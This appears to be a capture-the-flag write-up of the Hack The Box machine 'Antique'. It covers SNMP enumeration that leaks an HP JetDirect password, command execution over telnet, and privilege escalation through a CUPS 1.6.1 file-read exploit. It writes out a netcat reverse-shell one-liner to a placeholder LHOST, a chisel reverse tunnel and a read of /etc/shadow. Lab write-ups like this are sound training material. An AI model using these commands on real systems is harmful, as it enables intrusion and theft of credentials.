# Box: Antique
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.73.127 -v -p- -T4```

```
Nmap scan report for 10.129.73.127
Host is up (0.20s latency).
Not shown: 65125 closed tcp ports (reset), 409 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94%I=7%D=10/22%Time=65352588%P=x86_64-pc-linux-gnu%r(NUL
SF:L,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetRe
SF:quest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x
SF:20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DN
SF:SVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatus
SF:RequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword
SF::\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerb
SF:eros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswo
SF:rd:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%
SF:r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19
SF:,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\
SF:x20");
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host

TRACEROUTE (using port 3306/tcp)
HOP RTT    ADDRESS
1   ... 30

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 22 14:39:28 2023 -- 1 IP address (1 host up) scanned in 2057.09 seconds
```
We can see that port 23 is open. I decided to run a udp scan and found this

command:```sudo nmap 10.129.73.127 -sU -v -T4```

```
Nmap scan report for 10.129.73.127
Host is up (0.26s latency).
Not shown: 877 closed udp ports (port-unreach), 122 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Oct 22 14:58:34 2023 -- 1 IP address (1 host up) scanned in 1747.23 seconds
```
From our scan we can see a udp port that runs the snmp service. Les enumerate


# Enumeraton (Port 161/udp)

One tool we can use to enumerate the snmp service is ```snmpwalk```

command:```snmpwalk -v 2c -c public 10.129.73.127```

This command will retrieve information from the SNMP-enabled device

```
──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/antique]
└─$ snmpwalk -v 2c -c public 10.129.73.127                               
iso.3.6.1.2.1 = STRING: "HTB Printer"
```
We can see the string "HTB Printer", to check the type of printer lets connect to the telnet service

command:```telnet 10.129.73.127 23```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e5efa9c-d273-4410-8785-697e134435d9)

We can see the product name to be ```HP JetDirect```. 

Doing a little research, I found [this](https://www.irongeek.com/i.php?page=security/networkprinterhacking)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/944d6173-17fe-48ad-9c8c-540f526eab49)

So, to leak the password we can run the command ```snmpwalk -v 2c -c public 10.129.73.127 .1.3.6.1.4.1.11.2.3.9.1.1.13.0```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/antique]
└─$ snmpwalk -v 2c -c public 10.129.73.127 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
We get the hex value ```50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135```. Lets decode this using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57a9e173-9deb-4159-97e2-46e897978d89)

We got the password to be ```P@ssw0rd@123!!123```. Since we have the password lets enumerate port 23 hehe



# Enumeration (Port 23)

To authenticate the telnet service we can use the command ```telnet 10.129.73.127 23```. Then use the ```VRFY password``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11ca9696-da9e-435c-a95d-522e897b16fa)

Checking the help menu you should see this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/217b39f0-de93-432c-9952-5a64b08e5bfe)

So, we can execute system commands

Lets try to execute the linux command ```id```

command:```exec id```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b2a7762e-e624-4a31-8e43-bf7555f8af47)

Lets get a reverse shell

command:```exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc LHOST LPORT >/tmp/f"```

Ensure you provide the ```LHOST``` and ```LPORT```, also ensure you set up your netcat listener before running the command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1f776bce-b87e-47ef-a6fa-bf263b5043b6)

Checking our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4977200d-2072-409c-9bfe-4518c693503f)

We spawned a shell hehe

You can stabilize the shell using the following commands

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ca383816-7d01-47e6-8cac-5320feabbc2b)

Lets escalate our privileges




# Privilege Escalation

Running the command ```netstat -tulnp``` we find a tcp port ```631``` listening on localhost

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ee12584-fa3e-4bc7-b647-f6cfe9d5aea6)

Lets portfwd using chisel 

Sent chisel over to the target's machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7f8089c8-1490-440b-873c-a75dbee5a0c2)

On target's machine run this

command:```./chisel client <LHOST>:9001 R:631:10.150.150.222:631```

On your machine run this

command:```./chisel server -p 9001 --reverse```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/806caf47-431b-4efd-a2fd-38175467fd2b)

Now, navigate to the webpage ```http://127.0.01:631```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3bca1881-1641-4399-aafd-a7b9b9f2847c)

nice nice, our port forwarding was successful hehe. We can see that the webpage is running ```cups 1.6.1```

There's a vulnerability for this version of ```cups``` that enables us to read files that belongs to the root user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0efe8f0-649a-435f-91db-108838325535)

You can download it from [here](https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73a28096-8b66-4cb4-ac19-6093aac22e2b)

sent it over to the target's machine

To run it, use the command ```bash cups-root-file-read.sh```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d7770fe-d380-46f6-97b4-0bfa117e3ea8)

Lets try to read the ```/etc/shadow``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8a87f48-8db3-4e81-b9a2-76faa0dd0220)

nice nice, I doubt if we'll be able to crack that root password hash. So I just read the ```root.txt``` file directly

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cfc0003f-5311-43af-ba57-fa0ed5deb858)

We have successfully pwned this box

That will be all for today
<br><br>
[Back To Home](../../index.md)























